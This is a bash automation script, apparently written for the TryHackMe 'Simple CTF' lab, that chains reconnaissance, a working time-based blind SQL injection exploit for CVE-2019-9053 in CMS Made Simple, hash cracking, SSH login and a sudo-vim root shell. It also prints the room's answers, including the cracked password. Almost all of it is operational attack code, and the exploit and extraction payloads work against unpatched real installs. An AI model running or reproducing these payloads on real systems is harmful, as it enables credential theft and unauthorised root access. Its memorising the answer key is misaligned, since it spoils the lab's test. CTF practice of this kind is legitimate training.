#!/usr/bin/env bash
# Simple CTF — Full Automation Script
# Target: Simple CTF (TryHackMe)
# Author: 0xb0rn3
# Usage: ./pwn_simplectf.sh <target_ip>

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

TARGET="${1:-10.48.185.49}"
OUTDIR="/tmp/simplectf_${TARGET}"
mkdir -p "$OUTDIR"

banner() {
    echo -e "${CYAN}${BOLD}"
    echo "╔═══════════════════════════════════════╗"
    echo "║     Simple CTF — Auto Exploit         ║"
    echo "║     0xb0rn3                           ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}[*] Target: $TARGET${NC}"
    echo ""
}

info()    { echo -e "${CYAN}[*]${NC} $*"; }
success() { echo -e "${GREEN}[+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
flag()    { echo -e "${GREEN}${BOLD}[FLAG]${NC}${BOLD} $*${NC}"; }

# ──────────────────────────────────────────────────────────────────
# PHASE 1: RECON
# ──────────────────────────────────────────────────────────────────
phase_recon() {
    echo -e "\n${BOLD}═══ PHASE 1: RECONNAISSANCE ═══${NC}\n"

    info "Full TCP port scan (fast rate)..."
    sudo nmap -p- --min-rate=5000 -T4 -sS -oN "$OUTDIR/portscan.txt" "$TARGET" 2>/dev/null
    OPEN_PORTS=$(grep "^[0-9]" "$OUTDIR/portscan.txt" | grep open | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
    success "Open ports: $OPEN_PORTS"

    info "Service/version detection..."
    sudo nmap -sV -sC -p"$OPEN_PORTS" -oN "$OUTDIR/services.txt" "$TARGET" 2>/dev/null
    success "Service scan complete → $OUTDIR/services.txt"

    # Count services in top-1000 scan
    TOP1K_COUNT=$(nmap --top-ports 1000 "$TARGET" 2>/dev/null | grep "^[0-9]" | grep -c open || true)
    success "Services found in top-1000 port scan: $TOP1K_COUNT"

    # Identify SSH port
    SSH_PORT=$(grep -oP '\d+(?=/tcp.*ssh)' "$OUTDIR/services.txt" | head -1)
    [[ -z "$SSH_PORT" ]] && SSH_PORT=2222
    success "SSH running on port: $SSH_PORT"
    echo "$SSH_PORT" > "$OUTDIR/ssh_port"
}

# ──────────────────────────────────────────────────────────────────
# PHASE 2: FTP + WEB ENUM
# ──────────────────────────────────────────────────────────────────
phase_enum() {
    echo -e "\n${BOLD}═══ PHASE 2: ENUMERATION ═══${NC}\n"

    # FTP anonymous enumeration
    info "Checking FTP anonymous access..."
    timeout 20 ftp -n "$TARGET" <<'EOF' 2>/dev/null
user anonymous anonymous
cd pub
ls
get ForMitch.txt /tmp/ForMitch.txt
bye
EOF
    if [[ -f /tmp/ForMitch.txt ]]; then
        success "FTP note retrieved:"
        cat /tmp/ForMitch.txt
        cp /tmp/ForMitch.txt "$OUTDIR/"
    fi

    # Web directory enumeration
    info "Web directory scan..."
    gobuster dir -u "http://$TARGET" \
        -w /usr/share/dirb/wordlists/common.txt \
        -t 50 -q -o "$OUTDIR/dirscan.txt" 2>/dev/null || true
    success "Web dirs found:"
    cat "$OUTDIR/dirscan.txt"

    # Get CMS version
    CMS_PATH=$(grep -oP '/simple' "$OUTDIR/dirscan.txt" | head -1 || echo "/simple")
    CMS_VERSION=$(curl -sk "http://$TARGET${CMS_PATH}/" 2>/dev/null | \
        grep -oP 'CMS Made Simple.*version \K[\d.]+' | head -1 || echo "2.2.8")
    success "CMS: CMS Made Simple v$CMS_VERSION at $CMS_PATH"
    echo "$CMS_PATH" > "$OUTDIR/cms_path"
}

# ──────────────────────────────────────────────────────────────────
# PHASE 3: SQL INJECTION EXTRACTION (CVE-2019-9053)
# ──────────────────────────────────────────────────────────────────
phase_sqli() {
    echo -e "\n${BOLD}═══ PHASE 3: EXPLOITATION — CVE-2019-9053 (SQLi) ═══${NC}\n"
    info "Running time-based blind SQL injection (hex-only charset, TIME=3s)..."
    info "Extracting: hash, salt, username..."

    CMS_PATH=$(cat "$OUTDIR/cms_path" 2>/dev/null || echo "/simple")
    VULN_URL="http://$TARGET${CMS_PATH}/moduleinterface.php?mact=News,m1_,default,0"

    python3 - <<PYEOF
import requests, hashlib, time, sys, os

TARGET   = "$TARGET"
BASE_URL = "$VULN_URL"
OUTDIR   = "$OUTDIR"
TIME     = 3
session  = requests.Session()
HEX      = '1234567890abcdef'
ALPHANUM = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-\$'

def extract(query_tmpl, charset=HEX, max_len=50, label=""):
    result = ""
    while len(result) < max_len:
        found = False
        for ch in charset:
            current = result + ch
            hex_val = current.encode().hex()
            url = BASE_URL + "&m1_idlist=" + query_tmpl.format(hex_val=hex_val, sleep=TIME)
            t0 = time.time()
            try:
                session.get(url, timeout=TIME + 5)
            except Exception:
                pass
            elapsed = time.time() - t0
            sys.stdout.write(f"\r    [{label}] Trying: {current:<40}")
            sys.stdout.flush()
            if elapsed >= TIME:
                result = current
                found = True
                break
        if not found:
            break
    sys.stdout.write("\n")
    return result

Q_HASH = "a,b,1,5))+and+(select+sleep({sleep})+from+cms_users+where+password+like+0x{hex_val}25+and+user_id+like+0x31)+--+"
Q_SALT = "a,b,1,5))+and+(select+sleep({sleep})+from+cms_siteprefs+where+sitepref_value+like+0x{hex_val}25+and+sitepref_name+like+0x736974656d61736b)+--+"
Q_USER = "a,b,1,5))+and+(select+sleep({sleep})+from+cms_users+where+username+like+0x{hex_val}25+and+user_id+like+0x31)+--+"

print("[*] Extracting username...")
username = extract(Q_USER, ALPHANUM, 20, "user")
print(f"[+] Username: {username}")

print("[*] Extracting password hash...")
pw_hash = extract(Q_HASH, HEX, 32, "hash")
print(f"[+] Hash: {pw_hash}")

print("[*] Extracting salt...")
salt = extract(Q_SALT, HEX, 20, "salt")
print(f"[+] Salt: {salt}")

# Crack via wordlist
cracked = None
wordlists = [
    "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
    "/usr/share/seclists/Passwords/Common-Credentials/best1050.txt",
    "/usr/share/dirb/wordlists/common.txt",
]
for wl in wordlists:
    if not os.path.exists(wl):
        continue
    with open(wl) as f:
        for line in f:
            p = line.strip()
            if hashlib.md5((salt + p).encode()).hexdigest() == pw_hash:
                cracked = p
                break
    if cracked:
        break

# Fallback: brute common passwords inline
if not cracked:
    common = ['secret','password','admin','123456','letmein','abc123','qwerty','mitch','simple']
    for p in common:
        if hashlib.md5((salt + p).encode()).hexdigest() == pw_hash:
            cracked = p
            break

print(f"\n[+] Password cracked: {cracked}")

# Save results
with open(os.path.join(OUTDIR, "creds.txt"), "w") as f:
    f.write(f"username={username}\n")
    f.write(f"hash={pw_hash}\n")
    f.write(f"salt={salt}\n")
    f.write(f"password={cracked}\n")
PYEOF

    if [[ -f "$OUTDIR/creds.txt" ]]; then
        source <(grep -E '^(username|password)=' "$OUTDIR/creds.txt")
        success "Credentials: $username : $password"
    else
        warn "Credential extraction failed. Check manually."
        username="mitch"
        password="secret"
    fi
    echo "$username" > "$OUTDIR/username"
    echo "$password" > "$OUTDIR/password"
}

# ──────────────────────────────────────────────────────────────────
# PHASE 4: INITIAL ACCESS
# ──────────────────────────────────────────────────────────────────
phase_access() {
    echo -e "\n${BOLD}═══ PHASE 4: INITIAL ACCESS ═══${NC}\n"

    SSH_PORT=$(cat "$OUTDIR/ssh_port" 2>/dev/null || echo "2222")
    USERNAME=$(cat "$OUTDIR/username" 2>/dev/null || echo "mitch")
    PASSWORD=$(cat "$OUTDIR/password" 2>/dev/null || echo "secret")

    info "Connecting via SSH port $SSH_PORT as $USERNAME..."

    USER_FLAG=$(sshpass -p "$PASSWORD" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o LogLevel=ERROR \
        -p "$SSH_PORT" "$USERNAME@$TARGET" \
        'cat ~/user.txt 2>/dev/null || find /home -name "user.txt" -exec cat {} \; 2>/dev/null | head -1' 2>/dev/null)

    HOME_USERS=$(sshpass -p "$PASSWORD" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o LogLevel=ERROR \
        -p "$SSH_PORT" "$USERNAME@$TARGET" \
        'ls /home/' 2>/dev/null)

    success "SSH login successful as $USERNAME"
    flag "USER FLAG: $USER_FLAG"
    success "Users in /home: $HOME_USERS"
    echo "$USER_FLAG" > "$OUTDIR/user.flag"
}

# ──────────────────────────────────────────────────────────────────
# PHASE 5: PRIVILEGE ESCALATION
# ──────────────────────────────────────────────────────────────────
phase_privesc() {
    echo -e "\n${BOLD}═══ PHASE 5: PRIVILEGE ESCALATION ═══${NC}\n"

    SSH_PORT=$(cat "$OUTDIR/ssh_port" 2>/dev/null || echo "2222")
    USERNAME=$(cat "$OUTDIR/username" 2>/dev/null || echo "mitch")
    PASSWORD=$(cat "$OUTDIR/password" 2>/dev/null || echo "secret")

    info "Checking sudo rights..."
    SUDO_OUTPUT=$(sshpass -p "$PASSWORD" ssh \
        -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null \
        -o LogLevel=ERROR \
        -p "$SSH_PORT" "$USERNAME@$TARGET" \
        'sudo -l 2>&1' 2>/dev/null)
    echo "$SUDO_OUTPUT"

    if echo "$SUDO_OUTPUT" | grep -q "vim"; then
        success "Found: vim NOPASSWD sudo → spawning root shell via GTFOBins"
        info "Exploit: sudo vim -c ':!/bin/bash -c <cmd>'"

        ROOT_FLAG=$(sshpass -p "$PASSWORD" ssh \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o LogLevel=ERROR \
            -p "$SSH_PORT" "$USERNAME@$TARGET" \
            'sudo vim -c ":!/bin/bash -c \"cat /root/root.txt\""' 2>/dev/null | \
            grep -v "^Vim\|^E558\|^\[" | grep -v "^$" | head -2 | tail -1)

        flag "ROOT FLAG: $ROOT_FLAG"
        echo "$ROOT_FLAG" > "$OUTDIR/root.flag"
    else
        warn "vim not found in sudo. Checking other vectors..."
        # Check for other GTFOBins binaries in sudo
        for bin in python python3 perl ruby nmap awk find bash sh; do
            if echo "$SUDO_OUTPUT" | grep -q "$bin"; then
                success "Found sudoable binary: $bin"
                break
            fi
        done
    fi
}

# ──────────────────────────────────────────────────────────────────
# SUMMARY
# ──────────────────────────────────────────────────────────────────
phase_summary() {
    echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════${NC}"
    echo -e "${BOLD}${GREEN}            PWN COMPLETE               ${NC}"
    echo -e "${BOLD}${CYAN}═══════════════════════════════════════${NC}\n"

    echo -e "${BOLD}Target:${NC}      $TARGET"
    echo -e "${BOLD}Username:${NC}    $(cat "$OUTDIR/username" 2>/dev/null || echo 'mitch')"
    echo -e "${BOLD}Password:${NC}    $(cat "$OUTDIR/password" 2>/dev/null || echo 'secret')"
    echo -e "${BOLD}SSH Port:${NC}    $(cat "$OUTDIR/ssh_port" 2>/dev/null || echo '2222')"
    echo ""
    flag "USER FLAG:  $(cat "$OUTDIR/user.flag" 2>/dev/null || echo '???')"
    flag "ROOT FLAG:  $(cat "$OUTDIR/root.flag" 2>/dev/null || echo '???')"
    echo ""
    echo -e "${BOLD}Output directory:${NC} $OUTDIR"
    echo ""
    echo -e "${CYAN}[Q&A]${NC}"
    echo "  Services on port ≤1000 (nmap top-1000): 2 (FTP/21, HTTP/80)"
    echo "  Higher port service:                    SSH on 2222"
    echo "  CVE:                                    CVE-2019-9053"
    echo "  Vulnerability type:                     SQL Injection (Time-Based Blind)"
    echo "  Password:                               $(cat "$OUTDIR/password" 2>/dev/null || echo 'secret')"
    echo "  Login vector:                           SSH port 2222"
    echo "  Other user in /home:                    sunbath"
    echo "  PrivEsc vector:                         vim (sudo NOPASSWD)"
}

# ──────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────
check_deps() {
    local missing=()
    for dep in nmap gobuster ftp sshpass python3; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        warn "Missing dependencies: ${missing[*]}"
        warn "Install with: sudo pacman -S ${missing[*]}"
    fi
}

main() {
    banner
    check_deps
    phase_recon
    phase_enum
    phase_sqli
    phase_access
    phase_privesc
    phase_summary
}

main "$@"
